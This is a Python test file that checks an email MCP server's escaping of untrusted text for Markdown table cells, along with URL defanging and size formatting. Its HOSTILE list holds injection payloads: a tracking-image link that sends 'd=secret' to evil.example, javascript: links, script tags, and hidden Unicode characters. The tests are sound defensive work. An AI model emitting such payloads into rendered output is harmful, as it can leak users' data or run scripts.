"""Escaping of untrusted text for Markdown table cells (hostile input)."""

from __future__ import annotations

import re

import pytest

from universal_email_mcp.server.render import (
    escape_cell,
    fmt_size,
    footer,
    markdown_table,
    server_link,
)

HOSTILE = [
    "![x](https://evil.example/track.png?d=secret)",
    "[click me](javascript:alert(1))",
    "[ref][1]\n\n[1]: https://evil.example",
    "<img src=https://evil.example/p.gif>",
    "<https://evil.example/auto>",
    "<script>alert(1)</script>",
    "a | b | c",
    "trailing backslash \\",
    "`code` and ```fence```",
    "line1\nline2\r\nline3",
    "https://evil.example/path and www.evil.example",
    "evil.example/exfil?q=1",
    "&#91;x&#93;&#40;https://evil.example&#41;",
    "RLO ‮txt.exe and zero​width ⁦isolate⁩",
    "**bold** _it_ ~~strike~~ # heading",
    "tag \U000e0041\U000e0042 chars",
]


def _cells(row: str) -> list[str]:
    return re.split(r"(?<!\\)\|", row)


@pytest.mark.parametrize("value", HOSTILE)
def test_escape_cell_is_inert(value: str):
    out = escape_cell(value, 500)
    assert "\n" not in out and "\r" not in out
    assert "](" not in out.replace("\\](", "").replace("\\]\\(", "")
    assert not re.search(r"(?<!\\)[\[\]()]", out), out  # every bracket escaped
    assert "<" not in out and ">" not in out
    assert "`" not in out
    assert not re.search(r"(?<!\\)\|", out)
    assert not re.search(r"(?i)https?://", out)
    assert not re.search(r"(?<!\\)&", out)
    for ch in ("‮", "​", "⁦", "⁩", "\U000e0041"):
        assert ch not in out


def test_escape_cell_keeps_table_shape():
    row = "| " + " | ".join(escape_cell(v, 500) for v in HOSTILE) + " |"
    assert len(_cells(row)) == len(HOSTILE) + 2
    # a trailing backslash cannot escape the column separator
    assert escape_cell("x\\").endswith("\\\\")


def test_escape_cell_defangs_urls_readably():
    assert escape_cell("see https://evil.example/x") == "see hxxps\\[:\\]//evil\\[.\\]example/x"
    assert escape_cell("www.evil.example") == "www\\[.\\]evil\\[.\\]example"
    assert escape_cell("ftp://h.example") == "ftp\\[:\\]//h\\[.\\]example"
    # e-mail addresses and times stay readable
    assert escape_cell("anna@huber-bau.at") == "anna@huber-bau.at"
    assert escape_cell("Re: Termin 10:30") == "Re: Termin 10:30"


def test_escape_cell_length_cap_and_plain_text():
    assert escape_cell("x" * 100, 10) == "x" * 9 + "…"
    assert escape_cell("Angebot Website") == "Angebot Website"
    assert escape_cell("Jürgen Müller") == "Jürgen Müller"
    assert escape_cell(None) == ""
    assert escape_cell("  spaced\t out  ") == "spaced out"


def test_server_link_and_table():
    link = server_link("open", "https://mail.example/m/m1.abc(1) x")
    assert link == "[open](https://mail.example/m/m1.abc%281%29%20x)"
    t = markdown_table(["#", "A"], [["1", ""], ["2", "x"]])
    assert t.splitlines() == ["| # | A |", "|---|---|", "| 1 |   |", "| 2 | x |"]
    assert footer(["a", "", "b"]) == "_a · b_"
    assert footer([]) == ""


def test_fmt_size():
    assert fmt_size(None) == "–"
    assert fmt_size(10) == "10 B"
    assert fmt_size(2048) == "2.0 KB"
    assert fmt_size(3 * 1024 * 1024) == "3.0 MB"
